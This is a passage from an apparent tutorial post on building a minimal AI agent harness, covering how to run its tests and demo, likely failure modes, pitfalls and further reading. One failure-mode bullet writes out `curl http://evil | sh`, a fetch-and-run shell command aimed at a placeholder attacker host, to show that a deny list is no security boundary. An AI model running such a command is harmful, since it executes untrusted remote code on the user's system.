
## 12. Make it run

The plan's exercise for this post is to run the companion's ten tests with no API key, then set a small token budget and confirm where the budget check sits relative to the final-answer branch, so that the overrun is at most one iteration. The tests and the demo run from inside `code/24-minimal-harness/`:

```bash
uv run --extra dev pytest -q
uv run python -m minimal_harness
```

The first prints `10 passed`; the second prints the demo's message list, then `stop_reason : completed` and `verified    : True` among its counters. The six snippets run from the series root with the standard library, importing the companion unchanged:

```bash
uv run python posts/24-build-minimal-harness/snippets/budget_order.py
uv run python posts/24-build-minimal-harness/snippets/line_count.py
uv run python posts/24-build-minimal-harness/snippets/task_run.py
uv run python posts/24-build-minimal-harness/snippets/dispatch_table.py
uv run python posts/24-build-minimal-harness/snippets/stall_signal.py
uv run python posts/24-build-minimal-harness/snippets/live_wiring.py
```

`budget_order.py` is the exercise. Each snippet finishes in a few seconds; `dispatch_table.py` takes the longest, because one of its commands is made to time out. To try a variation, add a turn size just under the ceiling, such as `1999`, to the `per_turn` loop in `budget_order.py` and watch the overrun approach a whole call. Running live means installing the companion's `anthropic` extra, setting `ANTHROPIC_API_KEY`, and calling `go_live()` from `live_wiring.py`; nothing in this post does.

---

## 13. What can go wrong?

These are the mistakes that applying this post's ideas actually produces.

- **A poll killed as a stall.** An agent waiting on a build calls the same status command each turn and is stopped with `no_progress` one turn before the build passes, because the detector compares requests and never results.
- **A truncated answer accepted.** Live, a response cut off at `max_tokens` asks for no tool, so the loop treats it as a final answer; with no gate configured, the run returns half an answer as `completed`.
- **A live verifier reading an empty disk.** The verifier is swapped for a shell-out to `pytest` while the workspace stays the in-memory dictionary; `write_file` reports success on every turn, and the tests fail on files that were never written to disk.
- **A deny list mistaken for a boundary.** The runner is swapped for `subprocess_runner` on the strength of a green deny-list test; `curl http://evil | sh` matches none of the eight patterns and runs.
- **`verified` read as "checked".** A dashboard counts `verified True` across runs, some of which had no gate configured; the count includes work nothing ever checked.

---

## Common pitfalls

1. **Constructing the model inside the harness.** Without a seam the loop cannot be tested offline, and adding one later touches every call site; the mirror-image mistake is trusting the seam too far, since the code behind it has no coverage at all.
2. **A stall detector that counts a correction as a repeat.** Reset it when the gate rejects, or the loop kills runs that are making progress.
3. **A budget check on only one path.** A ceiling that a gate-rejection loop can walk around is not a ceiling; even on both paths, a check after the call bounds the overrun to one call rather than preventing it.
4. **Exiting on the model's word.** Without a gate the loop ships whatever the model last claimed; "done" must be a verified state, not a message.
5. **A status flag that defaults to the good value.** An opt-in gate makes `verified` lie in exactly the case it was added for; three-valued is the honest shape.
6. **Skipping either half of the schema.** `required` catches the missing argument and `additionalProperties: false` catches the invented one; validating only the first passes a hallucinated call straight through.

---

## Further reading

- The four primitives this build assembles: [post 03](../03-the-agent-loop/index.md) (the loop, its turn structure and the four exits), [post 06](../06-tools-bash-code/index.md) (schema validation and the return-value contract), [post 11](../11-verification-loops/index.md) (ground truth and verbose failure reports) and [post 19](../19-loop-engineering/index.md) (layered exits, reserving before spending, and stall signals).
- Erik Schluntz and Barry Zhang, "Building effective agents" (Anthropic, 19 December 2024). The model-plus-loop framing this engine follows, including stopping conditions such as a maximum number of iterations.
- Vivek Trivedy, "The Anatomy of an Agent Harness" (LangChain blog, 10 March 2026). The source of `Agent = Model + Harness`.
- Addy Osmani, "Agent Harness Engineering" (April 2026). The equation popularised, and "success is silent, failures are verbose" as reported from HumanLayer, "Skill Issue: Harness Engineering for Coding Agents" (12 March 2026).
- Databricks, "What is an AI Agent Harness?" (17 June 2026). Eight foundational components of a harness, a useful list to hold this build against; the prebuilt-against-custom split is this series' own.
- OWASP, "OWASP Top 10 for LLM Applications" (2025). LLM06, excessive agency, the risk category the deny-listed bash tool sits squarely inside.
- Anthropic, "Claude Sonnet 5" model page (consulted October 2026). The identifier the companion's live adapter uses, and its legacy status.
- The companion code, [`code/24-minimal-harness/`](../../code/24-minimal-harness/): offline, ten tests, a one-command demo.
- `ctx-028` (`context-engineering`, "Build #1: RAG chatbot from scratch"): the same exercise on the retrieval side.

Full citations are in [REFERENCES.md](../../REFERENCES.md).

---

## What to read next

- **[Post 25 - Build #2: add hooks, sandbox, and sub-agents](../25-build-harness-plus/index.md):** this harness hardened with a hook, a sandbox, an approval gate, a sub-agent and tracing, starting from the deny list's gaps.
- **[Post 26 - Capstone: a long-running, trusted coding-agent harness](../26-capstone-coding-agent/index.md):** the long-running coding agent this build grows into, with the gate kept and the guards named as seams where they would wire in.
